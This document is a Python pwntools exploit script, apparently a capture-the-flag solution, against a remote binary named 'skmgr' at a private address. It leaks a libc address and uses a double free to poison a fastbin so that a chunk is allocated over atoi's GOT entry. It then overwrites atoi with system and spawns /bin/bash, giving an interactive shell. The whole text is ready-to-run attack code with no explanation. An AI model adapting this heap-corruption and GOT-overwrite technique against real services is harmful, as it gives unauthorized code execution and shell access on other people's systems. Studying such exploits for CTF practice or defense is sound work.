from pwn import *
context.log_level="debug"

# conn=process("./skmgr")
conn=remote("10.131.1.19",60015)
libc=ELF("./bc.so.6")
elf=ELF("./skmgr")
account="hzhz\x00"
password="666"
def add(title,key,length=-1):
	conn.sendlineafter("0. exit\n>> ","1")
	if length == -1:
		length=len(key)+2
	conn.sendlineafter("Input key length...",str(length))
	conn.sendlineafter("Input title...",title)
	conn.sendlineafter("Input key...",key)
	conn.recvuntil("done.\n")

def check_account():
	conn.sendlineafter("Input Account Name >> ",account)
	conn.sendlineafter("Input Master Pass >> ",password)

def remove(id):
	conn.sendlineafter("0. exit\n>> ","4")
	check_account()
	conn.sendlineafter("Input id to remove...",str(id))
	conn.recvuntil("done.\n")

leak_add=0x0000000000401328
conn.sendlineafter("Set Your Account Name >> ",account)
conn.sendlineafter("Set Your Master Pass >> ",password)
conn.sendlineafter("0. exit\n>> ","9")
conn.sendlineafter("Input Account Name >> ","aaaaaaa")
conn.recvuntil("aaaaaaa\n")
##exploit libc
libc_add=(u64(conn.recvline()[:6]+"\x00\x00"))-0x7a81b
log.debug("libc address %s"%hex(libc_add))


# don't use malloc_hook, it doesn't work
atoi_got=elf.got["atoi"]
system_add=libc_add+libc.symbols["system"]

add("aaa","bbb",length=0x40)
add("aaa","bbb",length=0x40)
add("aaa","bbb",length=0x40)
remove(0)
remove(1)
remove(0)
add(p64(atoi_got-0x3b),"bbb",length=0x40) #0
add("aaa","bbb",length=0x40) #1
add("aaa","bbb",length=0x40) #0


## change atoi to system but don't change printf and read address
printf_add=libc_add+libc.symbols["printf"]
read_add=libc_add+libc.symbols["read"]

conn.sendlineafter("0. exit\n>> ","1")
conn.sendlineafter("Input key length...",'64')
payload=p64(printf_add)[-3:]+"z"*8+p64(read_add)+"z"*23+p64(system_add)+"\n"
conn.sendlineafter("Input title...",payload)
conn.sendlineafter("0. exit\n>> ","/bin/bash")
conn.interactive()

